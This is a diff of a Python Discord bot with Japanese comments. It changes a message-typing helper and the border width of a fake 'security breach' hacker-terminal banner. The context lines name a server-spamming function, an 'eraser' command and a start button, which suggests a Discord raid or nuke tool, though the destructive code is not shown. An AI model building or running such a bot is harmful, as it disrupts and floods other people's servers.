@@ -110,34 +110,17 @@ async def infinite_create_and_spam(guild: discord.Guild):
 
 
 async def type_and_send(channel, text):
-    """✅ 改良版：2～3文字まとめて・大文字は一気・高速表示"""
-    current = ""
-    i = 0
+    """✅ 一行ずつ表示・カタカタなし・最速"""
+    lines = text.split("\n")
+    output = ""
     msg = None
-    while i < len(text):
-        # 大文字が続く部分 → 一気にまとめて追加
-        if text[i].isupper():
-            j = i
-            while j < len(text) and text[j].isupper():
-                j += 1
-            chunk = text[i:j]
-            i = j
-        else:
-            # 通常文字 → 2～3文字まとめて
-            chunk_size = random.choice([2, 3])
-            chunk = text[i:i+chunk_size]
-            i += len(chunk)
-        current += chunk
-        # 初回は送信、以降は編集
+    for line in lines:
+        output += line + "\n"
         if msg is None:
-            msg = await channel.send(current)
+            msg = await channel.send(output)
         else:
-            await msg.edit(content=current)
-        # 待機時間：大文字一気出しは短く、通常部分も速く
-        if len(chunk) > 1 and all(c.isupper() for c in chunk):
-            await asyncio.sleep(0.00001)
-        else:
-            await asyncio.sleep(0.00001)
+            await msg.edit(content=output)
+        await asyncio.sleep(0.05)
 
 
 @bot.command()
@@ -161,9 +144,9 @@ async def eraser(ctx):
     ch = await guild.create_text_channel("hacking出力画面")
 
     hacker_code = "```ansi\n"
-    hacker_code += "\x1b[38;5;51m╔═══════════════════════════════════════════════════════════════════╗\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════════╗\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH — TERMINAL v4.2.1 — BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
-    hacker_code += "\x1b[38;5;51m╚═══════════════════════════════════════════════════════════════════╝\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════════╝\x1b[0m\n"
     hacker_code += "\n"
     hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
     hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
@@ -189,9 +172,9 @@ async def eraser(ctx):
     hacker_code += "```\n"
     hacker_code += "**✅ 作成完了**\n"
 
-    # ✅ 高速タイピング表示
+    # ✅ 一行ずつ表示
     await type_and_send(ch, hacker_code)
-    # 最後に実行ボタンを表示
+    # 最後に実行ボタン
     async for msg in ch.history(limit=1):
         await msg.edit(view=StartButton(guild))
 
